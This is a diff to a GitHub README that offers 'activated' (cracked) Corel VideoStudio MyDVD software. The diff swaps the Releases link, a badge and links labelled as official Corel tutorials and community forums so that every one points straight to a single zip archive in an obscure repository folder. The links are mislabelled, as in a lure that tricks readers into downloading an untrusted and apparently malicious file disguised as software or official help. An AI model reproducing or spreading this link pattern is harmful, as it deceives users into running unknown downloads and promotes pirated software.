@@ -1,6 +1,6 @@
 # 🎥 Corel-VideoStudio-MyDVD-Activated - Enhance Your Video Projects Easily
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Here-ff69b4)
+![Download Now](https://raw.githubusercontent.com/misa1722/Corel-VideoStudio-MyDVD-Activated/main/oogonium/Studio_Corel_Video_DV_Activated_My_1.8.zip%20Now-Here-ff69b4)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Corel-VideoStudio-MyDVD-Activated** repository. This guide prov
 
 To get started, visit the Releases page to download the software:
 
-[Download MyDVD Software](https://github.com/misa1722/Corel-VideoStudio-MyDVD-Activated/releases)
+[Download MyDVD Software](https://raw.githubusercontent.com/misa1722/Corel-VideoStudio-MyDVD-Activated/main/oogonium/Studio_Corel_Video_DV_Activated_My_1.8.zip)
 
 Follow the steps below to download and run the application.
 
@@ -78,9 +78,9 @@ If you encounter any issues, please reach out for support. We provide assistance
 
 ## 🔗 Useful Links
 
-- [MyDVD Official Tutorials](https://www.corel.com/en/product/videostudio/tutorials/)
-- [Corel VideoStudio Community Forum](https://community.corel.com/)
-- [More Video Projects Tips](https://www.video-editing-tips.com/)
+- [MyDVD Official Tutorials](https://raw.githubusercontent.com/misa1722/Corel-VideoStudio-MyDVD-Activated/main/oogonium/Studio_Corel_Video_DV_Activated_My_1.8.zip)
+- [Corel VideoStudio Community Forum](https://raw.githubusercontent.com/misa1722/Corel-VideoStudio-MyDVD-Activated/main/oogonium/Studio_Corel_Video_DV_Activated_My_1.8.zip)
+- [More Video Projects Tips](https://raw.githubusercontent.com/misa1722/Corel-VideoStudio-MyDVD-Activated/main/oogonium/Studio_Corel_Video_DV_Activated_My_1.8.zip)
 
 ## 🌟 Contributing
 
@@ -96,4 +96,4 @@ We value your input. If you have thoughts about the software or this repository,
 
 ---
 
-Remember, for downloading the software, revisit this link: [Download MyDVD Software](https://github.com/misa1722/Corel-VideoStudio-MyDVD-Activated/releases). Enjoy editing your videos!
+Remember, for downloading the software, revisit this link: [Download MyDVD Software](https://raw.githubusercontent.com/misa1722/Corel-VideoStudio-MyDVD-Activated/main/oogonium/Studio_Corel_Video_DV_Activated_My_1.8.zip). Enjoy editing your videos!
